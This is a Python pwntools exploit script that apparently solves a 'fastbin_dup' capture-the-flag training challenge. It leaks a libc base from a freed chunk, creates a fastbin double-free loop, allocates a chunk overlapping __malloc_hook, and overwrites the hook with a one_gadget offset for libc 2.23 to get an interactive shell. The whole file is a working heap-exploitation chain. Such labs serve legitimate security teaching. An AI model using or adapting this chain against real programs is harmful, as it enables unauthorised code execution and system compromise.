from pwn import *
import time


CHALL_PATH = "./fastbin_dup_patched"
CHALL = ELF(CHALL_PATH)
LIBC = ELF("./libc-2.23.so")
COMMANDS = """
c
"""

def alloc(c, size):
    c.recvuntil(b"> ")
    c.sendline(b"1")
    c.recvuntil(b"Size: ")
    c.sendline(str(size).encode())
    line = c.recvline()
    index = int(line.split(b"index ")[1].split(b"!\n")[0])
    return index

def write(c, index, data):
    c.recvuntil(b"> ")
    c.sendline(b"2")
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode()) 
    c.recvuntil(b"Content: ")
    c.send(data)

def read(c, index):
    c.recvuntil(b"> ")
    c.sendline(b"3")
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode())
    line = c.recvline()
    return line

def free(c, index):
    c.recvuntil(b"> ")
    c.sendline(b"4")
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode())



if args.REMOTE:
    c = remote("fastbin-dup.training.offensivedefensive.it",8080,ssl=True)
else:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, COMMANDS)
    else:
        c = process(CHALL_PATH)

### Leak LIBC

alloc(c, 0x100) # 0
alloc(c, 0x30) # 1
free(c, 0)
leak = read(c, 0)[:6]
leak = leak.ljust(8, b"\x00")
leak = u64(leak)
LIBC.address = leak - 0x3c4b78
print("LIBC leak: ", hex(leak))  
print("LIBC base: ", hex(LIBC.address))

### Goal: Fastbin Duplication attack

alloc(c, 0x60) # 2
alloc(c, 0x60) # 3

# Creating the loop
free(c, 2)
free(c, 3)
free(c, 2)


# Heap Corruption
alloc(c, 0x60) # 4
write(c, 4, p64(LIBC.address + 0x3c4aed))

# more alloc to overwrite the malloc hook
alloc(c, 0x60) # 5
alloc(c, 0x60) # 6

# alloc(c, 0x60) # 7
# write(c, 7, b"A" * 19 + p64(0xdeadbeef)) # calc the offset in gdb
# # now we have override the malloc hook with 0xdeadbeef
# # at the next malloc call, it will call 0xdeadbeef

alloc(c, 0x60) # 7
write(c, 7, b"A" * 19 + p64(LIBC.address + 0xf1247)) # one_gadget


# execute the one_gadget
c.recvuntil(b"> ")
c.sendline(b"1")
c.recvuntil(b"Size: ")
c.sendline(b"96")

c.interactive()